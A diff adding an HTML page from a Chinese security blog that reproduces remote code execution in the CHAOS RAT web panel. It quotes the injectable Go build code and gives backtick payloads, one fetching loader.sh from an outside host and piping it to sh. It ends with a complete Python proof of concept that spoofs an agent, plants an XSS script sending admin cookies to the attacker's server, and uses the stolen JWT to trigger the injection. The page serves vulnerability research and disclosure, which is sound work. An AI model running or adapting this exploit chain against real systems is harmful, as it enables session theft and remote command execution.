@@ -1,0 +1,351 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.2.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.2","exturl":false,"sidebar":{"position":"right","width":200,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+
+
+<link rel="canonical" href="http://example.com/2024/04/11/CHAOS-RAT-RCE/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2024/04/11/CHAOS-RAT-RCE/","path":"2024/04/11/CHAOS-RAT-RCE/","title":"CHAOS-RAT-RCE"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>CHAOS-RAT-RCE | Y0ng's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Y0ng's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AE%80%E4%BB%8B"><span class="nav-text">简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">代码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5"><span class="nav-text">命令注入</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#agent%E5%88%86%E6%9E%90"><span class="nav-text">agent分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS"><span class="nav-text">XSS</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%BB%84%E5%90%88"><span class="nav-text">漏洞组合</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#POC"><span class="nav-text">POC</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/04/11/CHAOS-RAT-RCE/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Y0ng">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Y0ng's Blog">
+      <meta itemprop="description" content="花有重开日，人无再少年">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="CHAOS-RAT-RCE | Y0ng's Blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          CHAOS-RAT-RCE
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-04-11 21:44:15" itemprop="dateCreated datePublished" datetime="2024-04-11T21:44:15+08:00">2024-04-11</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="url" rel="index"><span itemprop="name">代码审计</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>CHAOS RAT是由Golang开发的一款带有web面板的开源c2，主要用来挖矿，简单复现分析一下该RAT存在的rce漏洞</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411214402436.png" alt="image-20240411214402436"></p>
+<a id="more"></a>
+
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>项目地址：<a target="_blank" rel="noopener" href="https://github.com/tiagorlampert/CHAOS">https://github.com/tiagorlampert/CHAOS</a></p>
+<p>解压，docker运行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># Create a shared directory between the host and container</span><br><span class="line">$ mkdir ~&#x2F;chaos-container</span><br><span class="line"></span><br><span class="line">$ docker run -it -v ~&#x2F;chaos-container:&#x2F;database&#x2F; -v ~&#x2F;chaos-container:&#x2F;temp&#x2F; \</span><br><span class="line">  -e PORT&#x3D;8080 -e SQLITE_DATABASE&#x3D;chaos -p 8080:8080 tiagorlampert&#x2F;chaos:latest</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411155522973.png" alt="image-20240411155522973"></p>
+<h1 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h1><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>首先在BuildClient 函数找到了一处命令注入</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func (c clientService) BuildClient(input BuildClientBinaryInput) (string, error) &#123;</span><br><span class="line">	if !isValidIPAddress(input.ServerAddress) &amp;&amp; !isValidURL(input.ServerAddress) &#123;</span><br><span class="line">		return &quot;&quot;, internal.ErrInvalidServerAddress</span><br><span class="line">	&#125;</span><br><span class="line">	if !isValidPort(input.ServerPort) &#123;</span><br><span class="line">		return &quot;&quot;, internal.ErrInvalidServerPort</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	filename, err :&#x3D; utils.NormalizeString(input.Filename)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		return &quot;&quot;, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	newToken, err :&#x3D; c.GenerateNewToken()</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		return &quot;&quot;, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	const buildStr &#x3D; &#96;GO_ENABLED&#x3D;1 GOOS&#x3D;%s GOARCH&#x3D;amd64 go build -ldflags &#39;%s -s -w -X main.Version&#x3D;%s -X main.Port&#x3D;%s -X main.ServerAddress&#x3D;%s -X main.Token&#x3D;%s -extldflags &quot;-static&quot;&#39; -o ..&#x2F;temp&#x2F;%s main.go&#96;</span><br><span class="line"></span><br><span class="line">	filename &#x3D; buildFilename(input.OSTarget, filename)</span><br><span class="line">	buildCmd :&#x3D; fmt.Sprintf(buildStr, handleOSType(input.OSTarget), runHidden(input.RunHidden), c.AppVersion, input.ServerPort, input.ServerAddress, newToken, filename)</span><br><span class="line"></span><br><span class="line">	cmd :&#x3D; exec.Command(&quot;sh&quot;, &quot;-c&quot;, buildCmd)</span><br><span class="line">	cmd.Dir &#x3D; &quot;client&#x2F;&quot;</span><br><span class="line"></span><br><span class="line">	outputErr, err :&#x3D; cmd.CombinedOutput()</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		return &quot;&quot;, fmt.Errorf(&quot;%w:%s&quot;, err, outputErr)</span><br><span class="line">	&#125;</span><br><span class="line">	return filename, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本地验证命令注入，通过反引号成功实现命令注入</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411163237194.png" alt="image-20240411163237194"></p>
+<p>该函数在 generateBinaryPostHandler 中被调用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func (h *httpController) generateBinaryPostHandler(c *gin.Context) &#123;</span><br><span class="line">	var req request.GenerateClientRequestForm</span><br><span class="line">	if err :&#x3D; c.ShouldBindWith(&amp;req, binding.Form); err !&#x3D; nil &#123;</span><br><span class="line">		c.String(http.StatusBadRequest, err.Error())</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	osTarget, err :&#x3D; strconv.Atoi(req.OSTarget)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		c.String(http.StatusBadRequest, err.Error())</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	binary, err :&#x3D; h.ClientService.BuildClient(client.BuildClientBinaryInput&#123;</span><br><span class="line">		ServerAddress: req.Address,</span><br><span class="line">		ServerPort:    req.Port,</span><br><span class="line">		OSTarget:      system.OSTargetIntMap[osTarget],</span><br><span class="line">		Filename:      req.Filename,</span><br><span class="line">		RunHidden:     utils.ParseCheckboxBoolean(req.RunHidden),</span><br><span class="line">	&#125;)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		h.Logger.Error(err)</span><br><span class="line">		c.JSON(http.StatusInternalServerError, gin.H&#123;&quot;error&quot;: err.Error()&#125;)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	c.String(http.StatusOK, binary)</span><br><span class="line">	return</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>而该handler对应的后台路由为 /generate</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adminGroup.POST(&quot;&#x2F;generate&quot;, handler.generateBinaryPostHandler)</span><br></pre></td></tr></table></figure>
+
+<p>通过访问该路由，推测该函数用于生成client被控端，输入的参数例如RunHidden、ServerAddress、ServerPort等</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411162315891.png" alt="image-20240411162315891"></p>
+<p>抓包查看所需参数，只有 address、port、os_target、filename、run_hidden五个参数可控</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;generate HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.76.128:8080</span><br><span class="line">Cookie: XDEBUG_SESSION&#x3D;PHPSTORM; jwt&#x3D;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRob3JpemVkIjp0cnVlLCJleHAiOjE3MTI4MzAxODgsIm9yaWdfaWF0IjoxNzEyODI2NTg4LCJ1c2VyIjoiYWRtaW4ifQ.qaYqzrnAypBZ5dVkRk5LR4GX3U_10dnZxVK6IAwXyfc</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundary8RrfJ8oE1HE3x45z</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.76.128:8080&#x2F;generate</span><br><span class="line">Origin: http:&#x2F;&#x2F;192.168.76.128:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;123.0.0.0 Safari&#x2F;537.36</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Content-Length: 537</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary8RrfJ8oE1HE3x45z</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;address&quot;</span><br><span class="line"></span><br><span class="line">172.17.0.2</span><br><span class="line">------WebKitFormBoundary8RrfJ8oE1HE3x45z</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;port&quot;</span><br><span class="line"></span><br><span class="line">8080</span><br><span class="line">------WebKitFormBoundary8RrfJ8oE1HE3x45z</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;os_target&quot;</span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">------WebKitFormBoundary8RrfJ8oE1HE3x45z</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;filename&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary8RrfJ8oE1HE3x45z</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;run_hidden&quot;</span><br><span class="line"></span><br><span class="line">false</span><br><span class="line">------WebKitFormBoundary8RrfJ8oE1HE3x45z--</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是每个参数都有一定的检查，经过审计后，只有address存在利用可能</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if !isValidIPAddress(input.ServerAddress) &amp;&amp; !isValidURL(input.ServerAddress) &#123;</span><br><span class="line">	return &quot;&quot;, internal.ErrInvalidServerAddress</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if !isValidPort(input.ServerPort) &#123;</span><br><span class="line">    return &quot;&quot;, internal.ErrInvalidServerPort</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">filename, err :&#x3D; utils.NormalizeString(input.Filename)</span><br><span class="line">if err !&#x3D; nil &#123;</span><br><span class="line">    return &quot;&quot;, err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>针对isValidURL的绕过依旧利用反引号</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;&#39;&#96;touch &#x2F;tmp&#x2F;pwn&#96;&#39;</span><br><span class="line">or</span><br><span class="line">http:&#x2F;&#x2F;example.com&#39;$(IFS&#x3D;];b&#x3D;curl]192.168.1.6:80&#x2F;loader.sh;$b|sh)&#39;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411174432127.png" alt="image-20240411174432127"></p>
+<h2 id="agent分析"><a href="#agent分析" class="headerlink" title="agent分析"></a>agent分析</h2><p>生成的agent，主要有三个信息，serveraddress，serverport，token。前两个不用说，token用于agent的身份认证，这些信息都以string形式存放在agent的编译信息中</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411180504245.png" alt="image-20240411180504245"></p>
+<p>上线流程为：</p>
+<ol>
+<li>以http携带jwt为cookie字段，不断访问server的 /health 用于检测是否可达 和 /device 用于发送agent主机信息，server端将收到的信息保存，访问 /devices 用于查看所有的上线agent</li>
+<li>以websocket与server的 /client 建立连接，等待指令</li>
+</ol>
+<p>结合以上信息，通过提取agent的三个信息，可以伪造agent上线，并且可以控制向server的信息回传</p>
+<h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p>能造成xss的无非两个地方，主机信息 与 命令回传</p>
+<p>在命令回传处，直接输出，造成xss</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411191257276.png" alt="image-20240411191257276"></p>
+<p>伪造上线</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411191154093.png" alt="image-20240411191154093"></p>
+<p>输入命令，xss</p>
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411191401017.png" alt="image-20240411191401017"></p>
+<h2 id="漏洞组合"><a href="#漏洞组合" class="headerlink" title="漏洞组合"></a>漏洞组合</h2><p>伪造上线-&gt;xss-&gt;csrf-&gt;server端rce  或 伪造上线-&gt;xss-&gt;cookie登录-&gt;server端rce</p>
+<h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import time</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line">import json</span><br><span class="line">import websocket</span><br><span class="line">import argparse</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">from functools import partial</span><br><span class="line">from http.server import BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Collector(BaseHTTPRequestHandler):</span><br><span class="line">    def __init__(self, ip, port, target, *args, **kwargs):</span><br><span class="line">        self.ip &#x3D; ip</span><br><span class="line">        self.port &#x3D; port</span><br><span class="line">        self.target &#x3D; target</span><br><span class="line">        super().__init__(*args, **kwargs)</span><br><span class="line"></span><br><span class="line">    def do_GET(self):</span><br><span class="line">        print(self.path)</span><br><span class="line">        cookie &#x3D; self.path.split(&quot;&#x3D;&quot;)[1]</span><br><span class="line">        self.send_response(200)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(b&quot;&quot;)</span><br><span class="line"></span><br><span class="line">        print(f&quot;[+]Exploiting &#123;self.target&#125; with JWT &#123;cookie&#125;&quot;)</span><br><span class="line">        headers &#x3D; &#123;</span><br><span class="line">            &#39;User-Agent&#39;: &#39;Mozilla&#x2F;5.0 (X11; Linux x86_64; rv:109.0) Gecko&#x2F;20100101 Firefox&#x2F;115.0&#39;,</span><br><span class="line">            &#39;Content-Type&#39;: &#39;multipart&#x2F;form-data; boundary&#x3D;---------------------------196428912119225031262745068932&#39;,</span><br><span class="line">            &#39;Cookie&#39;: f&#39;jwt&#x3D;&#123;cookie&#125;&#39;</span><br><span class="line">        &#125;</span><br><span class="line">        requests.post(url&#x3D;f&quot;http:&#x2F;&#x2F;&#123;self.target&#125;&#x2F;generate&quot;,data&#x3D;f&#39;-----------------------------196428912119225031262745068932\r\nContent-Disposition: form-data; name&#x3D;&quot;address&quot;\r\n\r\nhttp:&#x2F;&#x2F;example.com&#x2F;\&#39;&#96;touch &#x2F;tmp&#x2F;pwn&#96;\&#39;\r\n-----------------------------196428912119225031262745068932\r\nContent-Disposition: form-data; name&#x3D;&quot;port&quot;\r\n\r\n8080\r\n-----------------------------196428912119225031262745068932\r\nContent-Disposition: form-data; name&#x3D;&quot;os_target&quot;\r\n\r\n1\r\n-----------------------------196428912119225031262745068932\r\nContent-Disposition: form-data; name&#x3D;&quot;filename&quot;\r\n\r\n\r\n-----------------------------196428912119225031262745068932\r\nContent-Disposition: form-data; name&#x3D;&quot;run_hidden&quot;\r\n\r\nfalse\r\n-----------------------------196428912119225031262745068932--\r\n&#39;,headers&#x3D;headers,verify&#x3D;False)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def convert_to_int_array(string):</span><br><span class="line">    int_array &#x3D; []</span><br><span class="line">    for char in string:</span><br><span class="line">        int_array.append(ord(char))</span><br><span class="line">    return int_array</span><br><span class="line"></span><br><span class="line">def extract_client_info(path):</span><br><span class="line">    with open(path, &#39;rb&#39;) as f:</span><br><span class="line">        data &#x3D; str(f.read())</span><br><span class="line"></span><br><span class="line">    address_regexp &#x3D; r&quot;main\.ServerAddress&#x3D;(?:[0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;&quot;</span><br><span class="line">    address_pattern &#x3D; re.compile(address_regexp)</span><br><span class="line">    address &#x3D; address_pattern.findall(data)[0].split(&quot;&#x3D;&quot;)[1]</span><br><span class="line"></span><br><span class="line">    port_regexp &#x3D; r&quot;main\.Port&#x3D;\d&#123;1,6&#125;&quot;</span><br><span class="line">    port_pattern &#x3D; re.compile(port_regexp)</span><br><span class="line">    port &#x3D; port_pattern.findall(data)[0].split(&quot;&#x3D;&quot;)[1]</span><br><span class="line"></span><br><span class="line">    jwt_regexp &#x3D; r&quot;main\.Token&#x3D;[a-zA-Z0-9_\.\-+&#x2F;&#x3D;]*\.[a-zA-Z0-9_\.\-+&#x2F;&#x3D;]*\.[a-zA-Z0-9_\.\-+&#x2F;&#x3D;]*&quot;</span><br><span class="line">    jwt_pattern &#x3D; re.compile(jwt_regexp)</span><br><span class="line">    jwt &#x3D; jwt_pattern.findall(data)[0].split(&quot;&#x3D;&quot;)[1]</span><br><span class="line"></span><br><span class="line">    return f&quot;&#123;address&#125;:&#123;port&#125;&quot;, jwt</span><br><span class="line"></span><br><span class="line">def keep_connection(target, cookie, hostname, username, os_name, mac, ip):</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">            &quot;Cookie&quot;: f&quot;jwt&#x3D;&#123;cookie&#125;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    while True:</span><br><span class="line">        data &#x3D; &#123;&quot;hostname&quot;: hostname, &quot;username&quot;:username,&quot;user_id&quot;: username,&quot;os_name&quot;: os_name, &quot;os_arch&quot;:&quot;amd64&quot;, &quot;mac_address&quot;: mac, &quot;local_ip_address&quot;: ip, &quot;port&quot;:&quot;8000&quot;, &quot;fetched_unix&quot;:int(time.time())&#125;</span><br><span class="line">        requests.get(f&quot;http:&#x2F;&#x2F;&#123;target&#125;&#x2F;health&quot;, headers&#x3D;headers)</span><br><span class="line">        requests.post(f&quot;http:&#x2F;&#x2F;&#123;target&#125;&#x2F;device&quot;, headers&#x3D;headers, json&#x3D;data)</span><br><span class="line">        time.sleep(30)</span><br><span class="line"></span><br><span class="line">def handle_command(target, cookie, mac, ip, port):</span><br><span class="line">    headers &#x3D; &#123;</span><br><span class="line">        &quot;Cookie&quot;: f&quot;jwt&#x3D;&#123;cookie&#125;&quot;,</span><br><span class="line">        &quot;X-Client&quot;: mac</span><br><span class="line">    &#125;</span><br><span class="line">    ws &#x3D; websocket.WebSocket()</span><br><span class="line">    ws.connect(f&#39;ws:&#x2F;&#x2F;&#123;target&#125;&#x2F;client&#39;, header&#x3D;headers)</span><br><span class="line">    while True:</span><br><span class="line">        ws.recv()</span><br><span class="line">        data &#x3D; &#123;&quot;client_id&quot;: mac, &quot;response&quot;: convert_to_int_array(f&quot;&lt;script&gt;var i &#x3D; new Image;i.src&#x3D;&#39;http:&#x2F;&#x2F;&#123;ip&#125;:&#123;port&#125;&#x2F;&#39;+document.cookie;&lt;&#x2F;script&gt;&quot;), &quot;has_error&quot;: False&#125;</span><br><span class="line"></span><br><span class="line">        ws.send_binary(json.dumps(data))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def run(ip, port, target):</span><br><span class="line">    server_address &#x3D; (ip, int(port))</span><br><span class="line"></span><br><span class="line">    collector &#x3D; partial(Collector, ip, port, target)</span><br><span class="line">    httpd &#x3D; HTTPServer(server_address, collector)</span><br><span class="line">    print(f&#39;Server running on port &#123;ip&#125;:&#123;port&#125;&#39;)</span><br><span class="line">    httpd.serve_forever()</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    parser &#x3D; argparse.ArgumentParser()</span><br><span class="line">    subparsers &#x3D; parser.add_subparsers(dest&#x3D;&quot;option&quot;)</span><br><span class="line"></span><br><span class="line">    exploit &#x3D; subparsers.add_parser(&quot;exploit&quot;)</span><br><span class="line">    exploit.add_argument(&quot;-f&quot;, &quot;--file&quot;,  help&#x3D;&quot;The path to the CHAOS client&quot;)</span><br><span class="line">    exploit.add_argument(&quot;-l&quot;, &quot;--local_ip&quot;, help&#x3D;&quot;The local IP to use for serving bash script and mp4&quot;, required&#x3D;True)</span><br><span class="line">    args &#x3D; parser.parse_args()</span><br><span class="line"></span><br><span class="line">    if args.option &#x3D;&#x3D; &quot;exploit&quot;:</span><br><span class="line">        target, jwt &#x3D; extract_client_info(args.file)</span><br><span class="line"></span><br><span class="line">        bg &#x3D; threading.Thread(target&#x3D;keep_connection, args&#x3D;(target, jwt, &quot;DC01&quot;, &quot;Administrator&quot;, &quot;Windows&quot;, &quot;3f:72:58:91:56:56&quot;, &quot;10.0.17.12&quot;))</span><br><span class="line">        bg.start()</span><br><span class="line"></span><br><span class="line">        cmd &#x3D; threading.Thread(target&#x3D;handle_command, args&#x3D;(target, jwt, &quot;3f:72:58:91:56:56&quot;, args.local_ip, 8000))</span><br><span class="line">        cmd.start()</span><br><span class="line"></span><br><span class="line">        server &#x3D; threading.Thread(target&#x3D;run, args&#x3D;(args.local_ip, 8000, target))</span><br><span class="line">        server.start()</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line">        parser.print_help(sys.stderr)</span><br><span class="line">        sys.exit(1)</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/chaos-rat-rce/image-20240411211951923.png" alt="image-20240411211951923"></p>
+<p><strong>Reference：</strong><a target="_blank" rel="noopener" href="https://blog.chebuya.com/posts/remote-code-execution-on-chaos-rat-via-spoofed-agents/">Remote code execution (CVE-2024-30850) on CHAOS RAT v5.01 web panel via spoofed agent callbacks (CVE-2024-31839) </a></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2024/04/11/%E6%98%93%E5%AE%9DOA/" rel="prev" title="易宝OA">
+                  <i class="fa fa-angle-left"></i> 易宝OA
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
